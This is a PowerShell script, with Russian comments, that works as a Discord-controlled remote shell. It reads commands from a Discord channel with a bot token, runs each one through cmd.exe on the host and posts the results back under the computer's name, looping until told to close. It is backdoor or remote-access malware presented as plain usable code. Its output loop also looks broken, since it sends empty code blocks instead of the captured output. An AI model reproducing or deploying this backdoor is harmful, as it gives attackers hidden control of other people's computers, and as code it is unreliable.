$token = "$tk"
$chan  = "$ch"

$response = ""
$previouscmd = ""
$authenticated = 0

function PullMsg {
    try {
        $wc = [System.Net.WebClient]::new()
        $wc.Headers.Add('Authorization', "Bot $token")
        $json = $wc.DownloadString("https://discord.com/api/v9/channels/$chan/messages?limit=5")
        $msg = ($json | ConvertFrom-Json | Where-Object {!$_.author.bot} | Select-Object -First 1).content
        if ($msg) { $script:response = $msg.Trim() }
    } catch {
        Write-Warning "Ошибка при получении сообщений: $_"
    }
}

function sendMsg {
    param([string]$Message)
    if (!$Message) { return }
    $Message = $Message -replace '`', "'"
    $uri = "https://discord.com/api/v9/channels/$chan/messages"
    $payload = @{
        "content" = $Message
        "username" = "$env:COMPUTERNAME"
    }
    $jsonBody = $payload | ConvertTo-Json -Compress
    $maxRetries = 3
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body $jsonBody -TimeoutSec 10 | Out-Null
            Write-Host "Message sent to Discord"
            break
        } catch {
            if ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 429) {
                Write-Warning "Rate limited, повторная отправка через 3 сек..."
                Start-Sleep -Seconds 3
                $retryCount++
            } elseif ($_.Exception.Response -and $_.Exception.Response.StatusCode.Value__ -eq 403) {
                Write-Warning "Запрещено (403) — проверь права бота"
                break
            } else {
                Write-Warning "Ошибка отправки: $_"
                break
            }
        }
    }
}

function Authenticate {
    if ($response -like "$env:COMPUTERNAME") {
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Сессия запущена!``  :white_check_mark:"
        sendMsg "``PS | $($PWD.Path)>``"
    } else {
        $script:authenticated = 0
        $script:previouscmd = $response
    }
}


# =================== ОСНОВНОЙ ЦИКЛ ===================
PullMsg
$previouscmd = $response
sendMsg ":hourglass_flowing_sand: **$env:COMPUTERNAME** | ``Ожидание команд..`` :hourglass_flowing_sand:"

while ($true) {
    PullMsg
    if ($response -and $response -ne $previouscmd) {
        $previouscmd = $response
        $dir = $PWD.Path

        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                sendMsg ":octagonal_sign: Сессия закрыта."
                break
            }
            if ($response -eq "Pause") {
                $authenticated = 0
                sendMsg ":pause_button: Сессия приостановлена."
                continue
            }

            # Исполняем команду через cmd.exe, гарантируем вывод
            $output = ""
            try {
                $output = (cmd.exe /c $response 2>&1 | Out-String).Trim()
            } catch {
                $output = "$_"
            }

            if ($output) {
                $maxBatchSize = 1900
                $total = $output.Length
                for ($i = 0; $i -lt $total; $i += $maxBatchSize) {
                    $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
                    sendMsg "``````"
                    Start-Sleep -Milliseconds 1000
                }
            } else {
                sendMsg ":white_check_mark: ``Команда отправлена`` :white_check_mark:"
            }

            sendMsg "``PS | $dir>``"
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}
